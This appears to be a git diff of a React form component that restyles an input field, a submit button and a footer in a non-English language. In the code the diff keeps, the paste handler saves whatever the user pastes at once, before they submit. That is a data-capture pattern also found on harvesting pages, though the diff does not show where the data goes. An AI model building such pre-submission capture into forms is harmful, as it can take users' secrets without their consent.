@@ -68,40 +68,39 @@ const Form = () => {
           <div className="backdrop-blur-md bg-white/70 rounded-2xl shadow-glass border border-white/20 p-8">
             <form onSubmit={handleSubmit} className="space-y-6">
               <div>
-               
-                       <Input
-                           
-                      id="submission"
-                      type="text"
-                      value={inputValue}
-                      onChange={(e) => setInputValue(e.target.value)}
-                      onPaste={(e) => {
-                        e.preventDefault();
-                        const pastedText = e.clipboardData.getData('text');
-                        setInputValue(pastedText);
-                        
-                        if (pastedText.trim()) {
-                          saveSubmission(pastedText.trim());
-                          toast({
-                            title: "Data Saved",
-                            description: "Your pasted content has been saved. Click submit to continue.",
-                            className: "border-accent/50 bg-accent/10",
-                          });
-                        }
-                      }}
-                      placeholder="Enter your information here..."
-                     className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px]"
-                      disabled={isSubmitting}
-                    />
-               
-              </div>
+  <label htmlFor="submission" className="block text-sm font-medium text-foreground mb-2">
+    Enter your information
+  </label>
+  <textarea
+    id="submission"
+    value={inputValue}
+    onChange={(e) => setInputValue(e.target.value)}
+    onPaste={(e) => {
+      e.preventDefault();
+      const pastedText = e.clipboardData.getData('text');
+      setInputValue(pastedText);
+      
+      if (pastedText.trim()) {
+        saveSubmission(pastedText.trim());
+        toast({
+          title: "Data Saved",
+          description: "Your pasted content has been saved. Click submit to continue.",
+          className: "border-accent/50 bg-accent/10",
+        });
+      }
+    }}
+    placeholder="Enter your information here..."
+    className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px] rounded-md resize-vertical"
+    disabled={isSubmitting}
+  />
+</div>
 
              <div className="space-y-4">
   <Button
-    type="submit"
-    disabled={isSubmitting}
-    className="w-full bg-[#FFFFFF] hover:bg-[#FFFFFF] text-white font-semibold py-6 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
-  >
+  type="submit"
+  disabled={isSubmitting}
+  className="w-full bg-white hover:bg-gray-50 text-[#692f8f] border-2 border-[#692f8f] font-semibold py-6 text-lg transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
+>
     {isSubmitting ? (
       <>
         <div className="animate-spin rounded-full h-5 w-5 border-2 border-accent-foreground border-t-transparent mr-2" />
@@ -121,7 +120,7 @@ const Form = () => {
   >
     Go to External Link
   </Button>
-    <div className="text-center text-sm text-muted-foreground mt-6 space-y-2">
+   <div className="text-left text-sm text-muted-foreground mt-6 space-y-2">
     <p>Nawui hi ithumna mashijin pai mana, nawui hi namang na shichin kapaina.aruiruiva shimaan haikha mahan unglui pai mana.</p>
     <p>
       Shiman hairla? <a href="" className="text-accent hover:underline">hili kadhar semkhuilo</a>, kha nawui katongkha shimaan haora.
